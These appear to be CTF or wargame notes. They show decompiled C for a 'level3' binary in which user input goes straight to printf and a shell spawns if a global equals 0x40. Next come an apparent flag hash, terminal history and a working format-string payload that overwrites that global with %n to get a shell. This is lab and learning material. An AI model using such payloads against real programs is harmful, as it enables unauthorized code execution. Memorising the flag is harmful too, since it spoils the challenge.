void v(void)

{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
  if (m == 0x40) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
  return;
}


void main(void)

{
  v();
  return;
}

b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

workspace man fgets
➜  workspace man ascii
➜  workspace python -c "print( 'A' * 64)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
➜  workspace 0x804988c
zsh: command not found: 0x804988c
➜  workspace 0x00000019
zsh: command not found: 0x00000019
➜  workspace 

(python -c "print '\x8c\x98\x04\x08' + '%x %x %x' + 'A' * 39 + '%n'" ; cat) | ./level3